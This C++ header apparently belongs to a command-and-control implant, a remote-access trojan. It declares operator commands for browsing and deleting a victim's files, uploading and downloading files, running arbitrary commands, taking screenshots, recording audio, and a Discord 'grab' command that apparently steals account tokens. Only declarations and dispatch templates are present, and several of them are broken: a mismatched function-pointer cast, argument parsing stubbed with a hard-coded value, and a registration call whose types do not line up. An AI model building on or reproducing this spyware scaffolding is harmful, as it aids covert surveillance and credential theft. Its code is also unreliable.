#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <memory>
#include <vector>
#include <iostream>
#include <typeinfo>
#include <typeindex>
#include <functional>
#include "controller.h"
#include "packet.h"


namespace c2 {
    template<class...> struct FnCaller;
    template<class T, class... Args> struct FnCaller<T, Args...> {
        template<class... Accum> static int call_fn(
            std::vector<char>& data,
            void* fn,
            Controller& ctrl,
            Accum... accumulated_args
        ) {
            if (typeid(T).hash_code() == typeid(int).hash_code()) {
                int parsed = 3; //TODO parse data arr
                return FnCaller<Args...>::call_fn(data, fn, ctrl, accumulated_args..., parsed);
            }
            return -1;
        }
    };
    template<> struct FnCaller<> {
        template<class... Accum> static int call_fn(
            std::vector<char>& data,
            void* fn,
            Controller& ctrl,
            Accum... accumulated_args
        ) {
            int(*proc)(Accum...) = (int(*)(Controller&, Accum...)) fn;
            return proc(ctrl, accumulated_args...);
        }
    };
}

class CommandPacket {
public:
    template<class... Args> static void build(
        unsigned char type,
        int(*proc)(Controller&, Args...),
        Controller& ctrl,
        std::vector<char>& data
    ) {
        c2::FnCaller<Args...>::call_fn(data, (void*) proc, ctrl);
    }
};

enum class NavigateCommand {
    ls, cd, pwd, rm
};

enum class AudioCommand {
    start, stop, list
};

enum class DiscordCommand {
    check, grab
};

// navigation
int pwd(Controller* ctrl);
int changeDir(Controller* ctrl, const std::string path);
int listFiles(Controller* ctrl, const std::string path);
int removeFile(Controller* ctrl, const std::string path);

// files
int downloadFile(Controller* ctrl, const std::string path);
int uploadFile(Controller* ctrl, const std::string path, size_t size, const char* data);

// exec
int exec(Controller* ctrl, const std::string cmd, bool wait);

// screen
int screenshot(Controller* ctrl);

// audio
int audioCommand(Controller* ctrl, AudioCommand cmd);

// discord
int discordCommand(Controller* ctrl, DiscordCommand cmd);

template<class... Args> void register_command(unsigned char type, std::unique_ptr<Packet>(*command)(Args...)) {
    Packet::register_type(type, std::bind(CommandPacket::build, type, command, _1, _2));
}

#endif